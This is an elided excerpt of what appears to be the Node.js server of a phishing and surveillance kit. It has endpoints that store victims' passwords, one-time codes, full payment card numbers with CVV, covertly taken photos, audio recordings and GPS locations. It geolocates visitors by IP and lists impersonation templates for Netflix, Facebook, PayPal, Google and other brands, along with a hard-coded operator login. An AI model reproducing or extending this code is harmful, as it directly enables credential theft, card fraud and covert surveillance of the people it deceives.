...
function loadCaptures() {
    if (fs.existsSync(CAPTURES_FILE)) return JSON.parse(fs.readFileSync(CAPTURES_FILE, 'utf8'));
    return [];
}
...
function loadUsers() {
    ...
    return [{username:'shadow',password:'shadow123',name:'Shadow'}];
}
...
function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0].trim() || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
}
...
async function getLocationFromIP(ip) {
    try {
        ...
        if (resp.data && resp.data.status !== 'fail') {
            return { lat: resp.data.lat || 0, lon: resp.data.lon || 0, city: resp.data.city || 'Unknown', country: resp.data.country || 'Unknown', region: resp.data.regionName || 'Unknown', isp: resp.data.isp || 'Unknown' };
        }
    } catch (e) {}
...
app.post('/api/capture/photo', (req, res) => {
    ...
    if (cap) { cap.photos.push(`/captures/photos/${imgName}`); saveCaptures(captures); }
...
app.post('/api/capture/credentials', (req, res) => {
    ...
    let captures = loadCaptures();
    const cap = captures.find(c => c.id === capture_id);
    if (cap) { cap.credentials = { username, password, email, phone, otp }; saveCaptures(captures); }
    res.json({ status: 'ok' });
});
...
app.post('/api/capture/card', (req, res) => {
    ...
    let captures = loadCaptures();
    const cap = captures.find(c => c.id === capture_id);
    if (cap) { cap.card_data = { card_number, expiry, cvv, name, zip }; saveCaptures(captures); }
    res.json({ status: 'ok' });
});
...
app.post('/api/capture/audio', (req, res) => {
    ...
    let captures = loadCaptures();
    const cap = captures.find(c => c.id === capture_id);
    if (cap) { cap.audio = `/captures/audio/${audioName}`; saveCaptures(captures); }
    res.json({ status: 'ok' });
});
...
app.post('/api/capture/location', (req, res) => {
    ...
    let captures = loadCaptures();
    const cap = captures.find(c => c.id === capture_id);
    if (cap) { cap.gps_location = { lat, lon, accuracy, timestamp: new Date().toISOString() }; saveCaptures(captures); }
    res.json({ status: 'ok' });
});

// ===== TEMPLATE ROUTES =====
const templates = ['netflix', 'facebook', 'instagram', 'tiktok', 'pubg', 'freefire', 'paypal', 'google', 'snapchat', 'wifi', 'gaming', 'google_wallet'];
